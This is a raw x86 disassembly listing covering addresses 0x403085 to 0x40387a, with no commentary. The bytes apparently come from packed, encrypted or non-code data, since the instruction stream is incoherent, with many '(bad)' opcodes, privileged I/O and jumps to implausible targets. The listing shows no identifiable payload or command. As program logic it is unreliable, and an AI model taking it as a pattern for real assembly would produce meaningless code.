  403085:	pop    es
  403086:	cdq    
  403087:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403088:	jb     0x4030ca
  40308a:	push   ecx
  40308b:	mov    WORD PTR [esi],?
  40308d:	jmp    0x5776dc6a
  403092:	sbb    al,ch
  403094:	push   ds
  403095:	(bad)  
  403096:	sub    al,0x9b
  403098:	sar    DWORD PTR [edx],0x49
  40309b:	push   ebp
  40309c:	arpl   WORD PTR [eax],ax
  40309e:	fdivr  st,st(5)
  4030a0:	rol    BYTE PTR [edi+ecx*4+0x47],0x8a
  4030a5:	xchg   BYTE PTR [esi-0x6fa87c4e],dl
  4030ab:	dec    BYTE PTR [edx+0x5aace12b]
  4030b1:	retf   0x81c1
  4030b4:	xchg   ebx,eax
  4030b5:	and    eax,0x7490c73
  4030ba:	xor    ah,BYTE PTR [edi]
  4030bc:	ins    DWORD PTR es:[edi],dx
  4030bd:	jns    0x403084
  4030bf:	paddw  mm3,QWORD PTR [ecx-0x70]
  4030c3:	nop    DWORD PTR ds:0xf4e0cba3
  4030ca:	and    ebx,DWORD PTR [edx]
  4030cc:	and    al,0x2a
  4030ce:	adc    DWORD PTR [ebp-0x4b15cd3c],esi
  4030d4:	aaa    
  4030d5:	cli    
  4030d6:	inc    edi
  4030d7:	inc    edi
  4030d8:	lock leave 
  4030da:	ret    
  4030db:	mov    edx,0xe8822add
  4030e0:	not    DWORD PTR [esi-0x18]
  4030e3:	push   ss
  4030e4:	mov    WORD PTR [ebx+0x36],?
  4030e7:	xor    esi,esi
  4030e9:	add    al,BYTE PTR [edx+0x69]
  4030ec:	push   ds
  4030ed:	pop    edx
  4030ee:	das    
  4030ef:	loopne 0x4030ce
  4030f1:	ret    0xda2
  4030f4:	lock cwde 
  4030f6:	daa    
  4030f7:	xchg   edi,eax
  4030f8:	jns    0x40311d
  4030fa:	pop    ecx
  4030fb:	sbb    eax,0x7e4e1acc
  403100:	aas    
  403101:	aad    0x56
  403103:	cs fwait
  403105:	bnd jbe 0x4030ca
  403108:	add    BYTE PTR [ebp-0x19e8794e],0x93
  40310f:	(bad)  
  403110:	xor    bh,BYTE PTR [eax+eax*4+0x7d0374ba]
  403117:	xor    al,0x44
  403119:	bound  edi,QWORD PTR [eax+0x11]
  40311c:	mov    esi,0xa8ed4958
  403121:	cmp    BYTE PTR [ebx+0x13],dh
  403124:	(bad)  
  403125:	cmp    eax,0x242e01e5
  40312a:	ins    BYTE PTR es:[edi],dx
  40312b:	xchg   ebp,eax
  40312c:	push   eax
  40312d:	ret    0x6a96
  403130:	push   esi
  403131:	or     al,0x7e
  403133:	data16 fcomp st(5)
  403136:	pop    esi
  403137:	mov    ah,0x13
  403139:	ja     0x4030d6
  40313b:	test   al,0xee
  40313d:	out    dx,eax
  40313e:	jnp    0x403120
  403140:	retf   
  403141:	imul   esp,DWORD PTR [ebp+0x6cb1e35f],0x2a1f1935
  40314b:	daa    
  40314c:	mov    ah,0xca
  40314e:	lods   eax,DWORD PTR ds:[esi]
  40314f:	(bad)  
  403150:	arpl   WORD PTR [ebp-0x91e9ffa],sp
  403156:	cmc    
  403157:	ret    
  403158:	lock std 
  40315a:	jbe    0x4030ee
  40315c:	sub    BYTE PTR ss:[edx],al
  40315f:	push   edx
  403160:	into   
  403161:	jbe    0x40310d
  403163:	xor    DWORD PTR [ecx],ecx
  403165:	or     BYTE PTR [edx+0x1c2f8a43],bl
  40316b:	mov    edx,0x33ad2f9a
  403170:	stc    
  403171:	jmp    0x403527
  403176:	data16 aas 
  403178:	in     eax,dx
  403179:	int3   
  40317a:	jne    0x403166
  40317c:	popa   
  40317d:	jno    0x4031dd
  40317f:	imul   esp,DWORD PTR [ebx],0x190b3387
  403185:	push   ecx
  403186:	ds adc eax,0x7d977070
  40318c:	jo     0x4031fe
  40318e:	outs   dx,BYTE PTR ds:[esi]
  40318f:	and    ah,bh
  403191:	jae    0x4031db
  403193:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403194:	pop    eax
  403195:	jl     0x403179
  403197:	fsub   QWORD PTR [edx-0x53a26031]
  40319d:	sahf   
  40319e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40319f:	jg     0x4031c7
  4031a1:	xchg   edx,eax
  4031a2:	push   ecx
  4031a3:	sub    al,0x76
  4031a5:	outs   dx,BYTE PTR ds:[esi]
  4031a6:	push   0x47
  4031a8:	(bad)  
  4031a9:	jg     0x4031fb
  4031ab:	sub    DWORD PTR [esi-0x63cb9c1a],edi
  4031b1:	add    al,ah
  4031b3:	rol    BYTE PTR [esi+0x7e],0x23
  4031b7:	mov    ecx,0xbd72c397
  4031bc:	add    ebp,DWORD PTR [edx]
  4031be:	push   edi
  4031bf:	pop    edx
  4031c0:	mov    ah,0x0
  4031c2:	test   bl,ah
  4031c4:	jbe    0x403200
  4031c6:	fwait
  4031c7:	or     DWORD PTR [edi+0x373a0846],0x35
  4031ce:	sar    DWORD PTR [edi],1
  4031d0:	sub    bh,BYTE PTR [ebp-0x14ef03e1]
  4031d6:	pop    ebp
  4031d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031d8:	push   0x763383c7
  4031dd:	add    al,0x29
  4031df:	pop    edi
  4031e0:	dec    eax
  4031e1:	mov    dh,0x49
  4031e3:	test   BYTE PTR [edi],0x58
  4031e6:	pop    ds
  4031e7:	sub    ebp,DWORD PTR [esp+ebx*4+0x2e]
  4031eb:	mov    bh,0xd3
  4031ed:	lds    ebx,FWORD PTR [edx-0x5f]
  4031f0:	test   ebx,ecx
  4031f2:	les    ecx,FWORD PTR [ecx]
  4031f4:	sbb    ebx,DWORD PTR [ebx]
  4031f6:	fst    DWORD PTR [ecx-0x58]
  4031f9:	sbb    eax,DWORD PTR [ebp+eiz*8-0x23d65a91]
  403200:	inc    esi
  403201:	cmp    BYTE PTR [edi+0x71],al
  403204:	xchg   cl,bh
  403206:	sbb    ebx,esp
  403208:	or     eax,eax
  40320a:	ds jmp 0x403203
  40320d:	arpl   WORD PTR [ecx-0x25348e52],sp
  403213:	mov    ebp,esi
  403215:	out    dx,al
  403216:	sbb    DWORD PTR [ebx-0x41],eax
  403219:	mov    ah,0xe3
  40321b:	scas   eax,DWORD PTR es:[edi]
  40321c:	sti    
  40321d:	dec    esp
  40321e:	addr16 js 0x403294
  403221:	add    eax,0x5cc7d9e7
  403226:	(bad)  [edi]
  403228:	mov    edx,0xbc1379a5
  40322d:	sbb    al,0x55
  40322f:	mov    al,0xac
  403231:	clc    
  403232:	add    al,0x6d
  403234:	cmp    DWORD PTR [eax+0x37ae3697],edx
  40323a:	mov    edx,DWORD PTR [ebp+0xf]
  40323d:	(bad)  
  40323e:	xor    ebp,DWORD PTR [ebx]
  403240:	inc    eax
  403241:	pusha  
  403242:	ss xchg edi,eax
  403244:	out    0xdd,al
  403246:	lds    esi,FWORD PTR [edx-0x54]
  403249:	xchg   edi,eax
  40324a:	dec    eax
  40324b:	xchg   ebx,ebx
  40324d:	test   eax,0x9941107b
  403252:	fisttp DWORD PTR [edi]
  403254:	inc    ebx
  403255:	xchg   BYTE PTR ds:0xacca7eda,dl
  40325b:	test   BYTE PTR [ecx+0x356a05bf],bh
  403261:	leave  
  403262:	aad    0x21
  403264:	outs   dx,DWORD PTR ds:[esi]
  403265:	imul   ecx,DWORD PTR [eax],0x4
  403268:	ins    BYTE PTR es:[edi],dx
  403269:	and    esp,DWORD PTR [esi]
  40326b:	clc    
  40326c:	hlt    
  40326d:	div    BYTE PTR [eax+0x7]
  403270:	sbb    ecx,ebp
  403272:	push   esi
  403273:	add    esp,ecx
  403275:	mov    ch,0x56
  403277:	into   
  403278:	rcl    BYTE PTR [edi+esi*8-0x6cf5f77e],1
  40327f:	dec    edi
  403280:	dec    edi
  403281:	xor    DWORD PTR [eax+0x1fa45a56],esp
  403287:	daa    
  403288:	and    al,0x0
  40328a:	mov    edi,0x1779af8
  40328f:	pop    ss
  403290:	out    0x12,eax
  403292:	daa    
  403293:	xchg   edx,eax
  403294:	push   esp
  403295:	test   al,0x83
  403297:	fwait
  403298:	idiv   DWORD PTR ds:0xf4745ab3
  40329e:	pop    ds
  40329f:	sbb    eax,0xc356450a
  4032a4:	sbb    DWORD PTR [ebx],edx
  4032a6:	adc    dh,bl
  4032a8:	and    ebx,DWORD PTR [ebp-0x68]
  4032ab:	imul   BYTE PTR [edi+edi*2-0x6a8b5107]
  4032b2:	inc    ebp
  4032b3:	(bad)  
  4032b4:	in     al,0x72
  4032b6:	lds    esp,FWORD PTR [esi-0x1768bd1e]
  4032bc:	adc    bl,BYTE PTR [esi-0x1f]
  4032bf:	mov    ebp,0xa994623
  4032c4:	cwde   
  4032c5:	(bad)  
  4032c6:	mov    esi,esi
  4032c8:	shr    BYTE PTR [edi],0x5d
  4032cb:	pusha  
  4032cc:	inc    eax
  4032cd:	mov    ds:0x3fbf6132,al
  4032d2:	and    DWORD PTR [esi],edi
  4032d4:	dec    esi
  4032d5:	sub    esp,ebp
  4032d7:	das    
  4032d8:	aad    0x5c
  4032da:	repz jns 0x4032c7
  4032dd:	(bad)  
  4032de:	sub    eax,0xbec7ef4e
  4032e3:	dec    ebp
  4032e4:	or     BYTE PTR [ebx-0x4033a87a],ch
  4032ea:	test   al,0x9d
  4032ec:	adc    DWORD PTR [edx],edi
  4032ee:	ss retf 0xbbd0
  4032f2:	xor    ebp,ebx
  4032f4:	lods   eax,DWORD PTR ds:[esi]
  4032f5:	int    0xa6
  4032f7:	lds    edx,FWORD PTR [ecx+0x2b]
  4032fa:	(bad)  
  4032fb:	dec    esi
  4032fc:	xor    esp,ebx
  4032fe:	push   ss
  4032ff:	cmc    
  403300:	push   edi
  403301:	or     ebx,DWORD PTR [ecx]
  403303:	mov    ebp,0x896cd940
  403308:	xchg   BYTE PTR [eax-0x4f],dl
  40330b:	mov    ds:0x6b12d1fb,al
  403310:	das    
  403311:	push   edi
  403312:	sub    eax,esp
  403314:	lock loope 0x4032b9
  403317:	add    eax,0x1f60a499
  40331c:	cmc    
  40331d:	push   ss
  40331e:	mov    ds:0x2e208650,eax
  403323:	ss jne 0x4032c4
  403326:	stc    
  403327:	or     al,0x24
  403329:	jle    0x4032f3
  40332b:	pop    ss
  40332c:	lds    esp,FWORD PTR [ebp+edx*8-0x43]
  403330:	jne    0x403328
  403332:	mov    ch,0x2d
  403334:	jge    0x40338d
  403336:	xor    BYTE PTR [edi],dl
  403338:	pop    ebp
  403339:	inc    edi
  40333a:	push   0xffffffa8
  40333c:	test   BYTE PTR [edi],0x6b
  40333f:	cmp    al,0xf6
  403341:	pop    eax
  403342:	retf   
  403343:	xor    BYTE PTR [eax+0x43207ea9],al
  403349:	test   al,0x96
  40334b:	inc    ebx
  40334c:	call   0x445f104e
  403351:	push   0x348616d7
  403356:	into   
  403357:	pop    ecx
  403358:	xor    al,0x5d
  40335a:	retf   
  40335b:	jb     0x40337d
  40335d:	or     DWORD PTR [ebp+0x16],ebp
  403360:	xor    DWORD PTR [ecx-0x2edf1fed],esp
  403366:	test   dh,cl
  403368:	adc    eax,0xd8ff57fe
  40336d:	retf   
  40336e:	or     DWORD PTR [edi-0x11],eax
  403371:	sahf   
  403372:	xor    BYTE PTR [edi+0x326e4c4f],cl
  403378:	fstp   QWORD PTR [ebp+0x55]
  40337b:	jl     0x4033e3
  40337d:	and    ecx,DWORD PTR [ebx-0x5b]
  403380:	repz sub al,0x9c
  403383:	(bad)  
  403385:	jecxz  0x4033fd
  403387:	jecxz  0x40336f
  403389:	sub    eax,0x81c2385a
  40338e:	push   ebp
  40338f:	in     al,dx
  403390:	xchg   esp,eax
  403391:	pop    ss
  403392:	mov    esp,0x5714b4a7
  403397:	xchg   edx,eax
  403398:	and    DWORD PTR [eax+0x6537eba],esi
  40339e:	mov    edi,0x4b077453
  4033a3:	mov    ebx,0xb59bda86
  4033a8:	inc    edx
  4033a9:	push   esp
  4033aa:	push   ebx
  4033ab:	nop
  4033ac:	sahf   
  4033ad:	lock push 0xe22cbf7a
  4033b3:	es pop esp
  4033b5:	add    al,bl
  4033b7:	push   ebx
  4033b8:	mov    ah,0xe2
  4033ba:	mov    dh,0xf4
  4033bc:	fistp  WORD PTR [ebx+edi*8+0x35]
  4033c0:	pop    edi
  4033c1:	cmc    
  4033c2:	cmp    ecx,DWORD PTR [esi+eiz*8]
  4033c5:	mov    ds:0xbb7bff2e,al
  4033ca:	out    0xf5,al
  4033cc:	icebp  
  4033cd:	into   
  4033ce:	sbb    BYTE PTR [esi+0x1bc52465],0xbc
  4033d5:	ror    DWORD PTR [esi-0x44],cl
  4033d8:	xor    BYTE PTR [eax],dh
  4033da:	mov    ?,ebp
  4033dc:	hlt    
  4033dd:	stos   BYTE PTR es:[edi],al
  4033de:	lods   eax,DWORD PTR ds:[esi]
  4033df:	aas    
  4033e0:	lahf   
  4033e1:	popf   
  4033e2:	sub    eax,0x4d71ff38
  4033e7:	sbb    ecx,eax
  4033e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033ea:	push   edx
  4033eb:	dec    eax
  4033ec:	pop    esi
  4033ed:	mov    dl,0x82
  4033ef:	sbb    al,0x56
  4033f1:	pop    ds
  4033f2:	sub    dl,BYTE PTR [ebp+0x2e]
  4033f5:	hlt    
  4033f6:	inc    edi
  4033f7:	sti    
  4033f8:	cmp    DWORD PTR [edi],esp
  4033fa:	mov    WORD PTR [edi],gs
  4033fc:	ret    0xde41
  4033ff:	jmp    FWORD PTR [ebx+0x58]
  403402:	sbb    eax,edi
  403404:	push   edx
  403405:	fadd   st(6),st
  403407:	or     dh,dh
  403409:	shr    DWORD PTR [esi],0xce
  40340c:	xchg   esp,eax
  40340d:	test   DWORD PTR [eax+0x473680a9],0xc134c5ec
  403417:	ds xchg edi,eax
  403419:	cmp    BYTE PTR [edi+0x2ff650c4],cl
  40341f:	fld    TBYTE PTR [eax]
  403421:	js     0x40349b
  403423:	adc    BYTE PTR [edx],0x9a
  403426:	ins    DWORD PTR es:[edi],dx
  403427:	lds    eax,FWORD PTR [ebx]
  403429:	mov    edi,DWORD PTR [ecx+0x3ac5ede7]
  40342f:	lds    ebp,FWORD PTR [edx]
  403431:	jmp    0x6650b173
  403436:	jmp    0x69c0:0xf08fc4ab
  40343d:	jb     0x4034a9
  40343f:	add    eax,0xb2f0f1f1
  403444:	push   esp
  403445:	jecxz  0x403457
  403447:	shl    BYTE PTR [ebx+0x6e64db56],0x47
  40344e:	sbb    DWORD PTR [edx],edx
  403450:	int3   
  403451:	pusha  
  403452:	rol    DWORD PTR [esi],1
  403454:	rcr    BYTE PTR [eax-0x68cbddb6],1
  40345a:	sar    BYTE PTR [ebp-0x1ba52bfd],cl
  403460:	mov    ebp,0xbd1056a8
  403465:	repnz mov WORD PTR [eax],?
  403468:	ror    BYTE PTR [edi-0x64],cl
  40346b:	or     bl,BYTE PTR [edi+0x28956750]
  403471:	xchg   esp,eax
  403472:	mov    dh,0x46
  403474:	gs xchg edi,eax
  403476:	int    0x2d
  403478:	cmovae eax,DWORD PTR [ecx+0x55eb63aa]
  40347f:	ja     0x4034d0
  403481:	out    0x1c,eax
  403483:	xor    al,0x50
  403485:	cmp    eax,0x33c4d18c
  40348a:	les    esi,FWORD PTR [ebx+0x5747d1b4]
  403490:	cmc    
  403491:	mov    ds:0xe207917d,eax
  403496:	or     DWORD PTR [edx],esp
  403498:	jl     0x4034c6
  40349a:	or     cl,BYTE PTR [esp+eax*2+0x201b190b]
  4034a1:	jmp    0x40347b
  4034a3:	add    edx,edx
  4034a5:	je     0x40346e
  4034a7:	loope  0x4034ba
  4034a9:	pop    edi
  4034aa:	push   0x2f6f771f
  4034af:	pop    edx
  4034b0:	mul    BYTE PTR [esi-0x4233cd4a]
  4034b6:	retf   
  4034b7:	cli    
  4034b8:	sub    BYTE PTR [edi+0xb9ff3f],ch
  4034be:	and    ecx,DWORD PTR [ecx-0x75]
  4034c1:	xlat   BYTE PTR ds:[ebx]
  4034c2:	push   edx
  4034c3:	push   edx
  4034c4:	cdq    
  4034c5:	(bad)  
  4034c7:	adc    ah,BYTE PTR [ebx+0x1f]
  4034ca:	loopne 0x403471
  4034cc:	repnz repz imul DWORD PTR [ecx-0x59643ce9]
  4034d4:	xchg   ecx,eax
  4034d5:	jmp    0xda0e:0x58ae3ec7
  4034dc:	mov    edx,0xa0105550
  4034e1:	dec    esp
  4034e2:	adc    edx,DWORD PTR ds:0x9ce803c2
  4034e8:	mov    ch,0x87
  4034ea:	xchg   edi,eax
  4034eb:	outs   dx,BYTE PTR ds:[esi]
  4034ec:	jg     0x403569
  4034ee:	loope  0x40348f
  4034f0:	mov    al,0x2f
  4034f2:	and    al,0x66
  4034f4:	out    dx,eax
  4034f5:	add    DWORD PTR [ebx+ebp*4+0x2d1788dd],eax
  4034fc:	fisub  WORD PTR [esp+ebp*2+0x12]
  403500:	ret    0x3bd8
  403503:	jg     0x40352c
  403505:	mov    esi,0x3b1a4bae
  40350a:	push   si
  40350c:	dec    eax
  40350d:	neg    DWORD PTR [ebp-0x2d8063bd]
  403513:	cli    
  403514:	pop    ecx
  403515:	lea    ebp,[edx]
  403517:	hlt    
  403518:	inc    esi
  403519:	mov    edi,0xebd6f427
  40351e:	mov    fs,WORD PTR [ebx-0x58]
  403521:	inc    eax
  403522:	bound  ebx,QWORD PTR [edx+0x31a0b04]
  403528:	dec    BYTE PTR [ebx-0x50f0f78b]
  40352e:	cli    
  40352f:	mov    ebx,DWORD PTR [ebp+0xc]
  403532:	jmp    0x4038e8
  403537:	jle    0x4034ce
  403539:	mov    esi,0x45d75507
  40353e:	xchg   ebp,eax
  40353f:	icebp  
  403540:	repz cs jle 0x40356f
  403544:	mov    WORD PTR [esi-0x63],cs
  403547:	push   ebp
  403548:	adc    dh,BYTE PTR [eax+0x70]
  40354b:	xchg   edi,eax
  40354c:	jge    0x4035be
  40354e:	jo     0x40358a
  403550:	outs   dx,BYTE PTR ds:[esi]
  403551:	adc    al,0x98
  403553:	mov    edi,0x8bea3451
  403558:	cmp    esp,DWORD PTR [ecx+0x39]
  40355b:	jnp    0x40357a
  40355d:	inc    esi
  40355e:	jle    0x4034ec
  403560:	pop    es
  403561:	mov    ds:0x2d2c9869,eax
  403566:	adc    DWORD PTR [eax],edx
  403568:	pop    eax
  403569:	neg    BYTE PTR [edi+0x7d9ebb19]
  40356f:	dec    esp
  403570:	adc    eax,0xc6fa89d5
  403575:	leave  
  403576:	cwde   
  403577:	dec    edx
  403578:	loopne 0x4035e1
  40357a:	dec    esi
  40357b:	pop    ebp
  40357c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40357d:	mov    eax,0x3cbff827
  403582:	(bad)  [edx-0x43f27987]
  403588:	and    eax,0x4215faa6
  40358d:	mov    esp,0xa6970afd
  403592:	mov    DWORD PTR [edx-0x211c6dc4],edi
  403598:	fmul   DWORD PTR [esi+0x46]
  40359b:	cli    
  40359c:	xchg   esi,eax
  40359d:	es sbb al,0x32
  4035a0:	leave  
  4035a1:	jbe    0x403560
  4035a3:	push   edi
  4035a4:	cmp    ebx,DWORD PTR [eax-0x2ce98d7a]
  4035aa:	ret    0x6e23
  4035ad:	and    dl,BYTE PTR [ebx-0x44]
  4035b0:	fbstp  TBYTE PTR [edi*4-0x1cd5e924]
  4035b7:	shl    BYTE PTR [ebx-0x39539c84],1
  4035bd:	xchg   esi,eax
  4035be:	push   ebx
  4035bf:	xor    eax,0x3608aa4e
  4035c4:	xchg   ebx,eax
  4035c5:	push   ds
  4035c6:	call   0xc58f:0x20ffb3f
  4035cd:	xchg   BYTE PTR [edi-0x4b],bh
  4035d0:	ja     0x40357d
  4035d2:	clc    
  4035d3:	enter  0x53dd,0x20
  4035d7:	rcr    BYTE PTR [ecx],0x7d
  4035da:	pop    ss
  4035db:	fcmovnu st,st(6)
  4035dd:	rcr    BYTE PTR [edx+0x3de97510],0x14
  4035e4:	jne    0x40358e
  4035e6:	or     ah,BYTE PTR [edx-0x7e]
  4035e9:	and    edi,ebx
  4035eb:	ins    BYTE PTR es:[edi],dx
  4035ec:	mov    bh,0x65
  4035ee:	pop    ecx
  4035ef:	jl     0x4035d3
  4035f1:	xchg   ebp,eax
  4035f2:	cmp    BYTE PTR [edi-0x14],dl
  4035f5:	xchg   BYTE PTR [edi+0x1180cf92],bl
  4035fb:	sbb    esp,ebp
  4035fd:	cli    
  4035fe:	repz jnp 0x4035be
  403601:	in     al,dx
  403602:	xor    BYTE PTR [edx+edx*4-0x63],dl
  403606:	dec    ebx
  403607:	jbe    0x403638
  403609:	jmp    0xdc5604ea
  40360e:	xchg   ecx,eax
  40360f:	ficomp DWORD PTR [ecx+ecx*1]
  403612:	xchg   edi,eax
  403613:	repz add DWORD PTR [edx-0x52],0xb6a87395
  40361b:	dec    esi
  40361c:	fst    QWORD PTR [ebx-0x3155c042]
  403622:	jae    0x40362a
  403624:	pop    ebx
  403625:	cld    
  403626:	xor    BYTE PTR [ecx-0x77],ch
  403629:	iret   
  40362a:	pop    eax
  40362b:	mov    eax,0xb728f164
  403630:	icebp  
  403631:	or     eax,0x7bca63f4
  403636:	pop    eax
  403637:	mov    ebx,0xb64459d6
  40363c:	imul   ebp,edi,0xffffffb5
  40363f:	sub    al,0x4f
  403641:	repz in eax,0xcb
  403644:	xchg   ebp,edx
  403646:	repnz ss dec esp
  403649:	cli    
  40364a:	sub    ecx,DWORD PTR [edx-0x679d09e8]
  403650:	(bad)  
  403651:	cmp    ebp,DWORD PTR [ebx+0x39]
  403654:	adc    DWORD PTR [eax],edx
  403656:	mov    esp,0x6129610c
  40365b:	fdivp  st(5),st
  40365d:	scas   eax,DWORD PTR es:[edi]
  40365e:	adc    al,0xeb
  403660:	mov    ecx,0x5e260ba3
  403665:	fldenv [ebx-0x1c]
  403668:	data16 adc al,0x2b
  40366b:	ret    0x77a7
  40366e:	sub    al,0x8a
  403670:	lods   al,BYTE PTR ds:[esi]
  403671:	(bad)  
  403672:	mov    esi,0xec44b373
  403677:	jge    0x4036b8
  403679:	push   cs
  40367a:	fcmovnbe st,st(1)
  40367c:	out    dx,eax
  40367d:	mov    ebx,0x794dc5a3
  403682:	pop    edi
  403683:	dec    BYTE PTR [edx+0x6cf4e112]
  403689:	xchg   BYTE PTR [esi],ch
  40368b:	and    DWORD PTR [edi-0x1191f52e],esi
  403691:	and    edi,ecx
  403693:	cdq    
  403694:	stc    
  403695:	ret    
  403696:	xor    eax,0x9ed66b6
  40369b:	pop    esp
  40369c:	dec    ecx
  40369d:	out    dx,eax
  40369e:	lds    esp,FWORD PTR ds:0x4c05bf60
  4036a4:	dec    ecx
  4036a5:	(bad)  
  4036a6:	dec    eax
  4036a7:	adc    dh,BYTE PTR [edi]
  4036a9:	jno    0x403642
  4036ab:	cld    
  4036ac:	cmp    eax,0x4db7dac4
  4036b1:	imul   esi,DWORD PTR [edx],0xffffffd4
  4036b4:	xlat   BYTE PTR ds:[ebx]
  4036b5:	loope  0x403653
  4036b7:	outs   dx,BYTE PTR ds:[esi]
  4036b8:	xchg   BYTE PTR [ebp-0x39],bl
  4036bb:	pop    gs
  4036bd:	dec    ebp
  4036be:	ja     0x40365c
  4036c0:	pop    ebx
  4036c1:	add    eax,0xbf44f731
  4036c6:	and    BYTE PTR [eax+0x32],dh
  4036c9:	adc    DWORD PTR [edi+ebp*8-0x39c089f8],eax
  4036d0:	push   edi
  4036d1:	add    edi,DWORD PTR [edx]
  4036d3:	push   eax
  4036d4:	sbb    esi,DWORD PTR [ecx+eiz*8-0x25]
  4036d8:	push   cs
  4036d9:	xchg   ebp,eax
  4036da:	sub    eax,0xfcb6e9d9
  4036df:	or     eax,0xe1f2a1f5
  4036e4:	or     BYTE PTR [edx],ch
  4036e6:	ret    
  4036e7:	jg     0x4036aa
  4036e9:	dec    esi
  4036ea:	pop    ebp
  4036eb:	and    BYTE PTR [edx+0x75],bh
  4036ee:	xor    edx,DWORD PTR [ebx+0x60e064f4]
  4036f4:	cmp    BYTE PTR [edi],ch
  4036f6:	add    eax,0xdb1be4ba
  4036fb:	sbb    cl,BYTE PTR [eax-0x26]
  4036fe:	push   ss
  4036ff:	hlt    
  403700:	arpl   WORD PTR [ebx],dx
  403702:	push   esi
  403703:	adc    eax,0xd4274741
  403708:	push   0x9b64dc64
  40370d:	sub    eax,ebp
  40370f:	out    0xc,al
  403711:	pop    edi
  403712:	(bad)  
  403713:	push   ecx
  403714:	mov    ss,WORD PTR [ebp+0x38]
  403717:	inc    esp
  403718:	daa    
  403719:	mov    edi,0x8f94669b
  40371e:	jl     0x4036f7
  403720:	es je  0x403796
  403723:	cmp    al,0xc2
  403725:	outs   dx,BYTE PTR ds:[esi]
  403726:	inc    ecx
  403727:	call   0xea4faedf
  40372c:	inc    edi
  40372d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40372e:	pop    ss
  40372f:	sar    DWORD PTR [ecx+0x40ec3b6f],1
  403735:	inc    ecx
  403736:	push   0x3382099c
  40373b:	xor    esi,DWORD PTR [edx]
  40373d:	in     eax,0xd2
  40373f:	int3   
  403740:	jge    0x403747
  403742:	inc    edx
  403743:	inc    ecx
  403744:	xor    bh,al
  403746:	mov    BYTE PTR [ebp-0x34b50eb2],bl
  40374c:	cmp    al,BYTE PTR [ecx-0x4d]
  40374f:	pop    edi
  403750:	(bad)  
  403751:	jns    0x40372d
  403753:	push   edi
  403754:	ins    DWORD PTR es:[edi],dx
  403755:	call   0x623eceb1
  40375a:	or     bh,ah
  40375c:	je     0x403764
  40375e:	call   0x17e3:0x688d9ad1
  403765:	fisttp DWORD PTR [edx+0x4ac7e0c9]
  40376b:	jne    0x4037bb
  40376d:	into   
  40376e:	inc    edx
  40376f:	sub    al,0xd6
  403771:	scas   eax,DWORD PTR es:[edi]
  403772:	ja     0x4037b1
  403774:	inc    eax
  403775:	(bad)  
  403776:	sbb    bl,ah
  403778:	xchg   ebp,eax
  403779:	rol    BYTE PTR [esi+0x6e],0xb5
  40377d:	or     ecx,esi
  40377f:	jbe    0x403752
  403781:	loopne 0x40370f
  403783:	inc    ecx
  403784:	mul    BYTE PTR [ebx+0x36]
  403787:	push   esi
  403788:	push   ebx
  403789:	sbb    DWORD PTR [edx-0x294d5b87],ecx
  40378f:	lods   eax,DWORD PTR ds:[esi]
  403790:	(bad)  
  403792:	lods   al,BYTE PTR ds:[esi]
  403793:	lahf   
  403794:	xor    esi,ecx
  403796:	test   al,0xd3
  403798:	dec    ebx
  403799:	aaa    
  40379a:	cmp    al,0x82
  40379c:	lods   al,BYTE PTR ds:[esi]
  40379d:	pop    esi
  40379e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40379f:	gs xor al,0x3c
  4037a2:	inc    edx
  4037a3:	mov    dl,0xf4
  4037a5:	cmp    eax,0xf984d75b
  4037aa:	out    dx,al
  4037ab:	xor    DWORD PTR [ebp-0x543f48e6],eax
  4037b1:	stos   BYTE PTR es:[edi],al
  4037b2:	nop
  4037b3:	(bad)  
  4037b4:	cs dec ebp
  4037b6:	fwait
  4037b7:	xchg   esp,eax
  4037b9:	in     eax,dx
  4037ba:	mov    eax,0x4a1a1090
  4037bf:	push   edx
  4037c0:	sbb    al,0x65
  4037c2:	cwde   
  4037c3:	gs push ebp
  4037c5:	jge    0x403759
  4037c7:	sbb    eax,0xc1496433
  4037cc:	push   cs
  4037cd:	test   DWORD PTR [eax-0x5defaca7],esi
  4037d3:	mov    ah,0x39
  4037d5:	mov    ecx,0x15c3aaee
  4037da:	ror    esp,1
  4037dc:	add    eax,0x60971df0
  4037e1:	int    0x47
  4037e3:	mov    ch,0xd8
  4037e5:	dec    esi
  4037e6:	push   ebp
  4037e7:	add    DWORD PTR ds:0xe98081a1,edx
  4037ed:	in     al,0xea
  4037ef:	push   0xe3a98f26
  4037f4:	sti    
  4037f5:	sbb    ebx,esi
  4037f7:	test   BYTE PTR [esi+0x4dee5405],0xc6
  4037fe:	arpl   dx,cx
  403800:	xor    eax,esi
  403802:	and    bh,bh
  403804:	inc    esi
  403805:	mov    ecx,0x751d10fa
  40380a:	mov    eax,ds:0xc2310740
  40380f:	cmp    DWORD PTR [edi-0x64],ecx
  403812:	shl    BYTE PTR [edx],cl
  403814:	adc    BYTE PTR ds:0xdbe24c13,ch
  40381a:	and    dl,BYTE PTR [edi]
  40381c:	pushf  
  40381d:	pop    ecx
  40381e:	mov    bh,0xa2
  403820:	mov    al,ds:0xbb0c2b72
  403825:	adc    eax,0xe43df0be
  40382a:	jp     0x40380f
  40382c:	(bad)
  40382f:	(bad)  
  403830:	lods   al,BYTE PTR ds:[esi]
  403831:	loop   0x403831
  403833:	in     al,dx
  403834:	popf   
  403835:	int3   
  403836:	iret   
  403837:	adc    eax,0x172eddc6
  40383c:	test   BYTE PTR [eax+edx*1-0x54],al
  403840:	es pop ss
  403842:	sub    al,0x32
  403844:	mov    bh,0xe0
  403846:	pop    eax
  403847:	scas   eax,DWORD PTR es:[edi]
  403848:	push   ds
  403849:	mov    DWORD PTR [esi],edx
  40384b:	adc    ch,al
  40384d:	cli    
  40384e:	push   esp
  40384f:	mov    ebx,0x25a1c790
  403854:	fiadd  DWORD PTR [edi+edi*4+0x78]
  403858:	aas    
  403859:	inc    esi
  40385a:	xchg   DWORD PTR [ecx+0xb5d80e],esp
  403860:	mov    ecx,0xfb937e6e
  403865:	arpl   WORD PTR [ecx],bx
  403867:	js     0x4038ba
  403869:	add    BYTE PTR [ebp-0x5a],dl
  40386c:	(bad)  
  40386e:	ins    BYTE PTR es:[edi],dx
  40386f:	jmp    0xb4625e8e
  403874:	std    
  403875:	loop   0x403875
  403877:	icebp  
  403878:	jl     0x403846
  40387a:	jae    0x4038c3
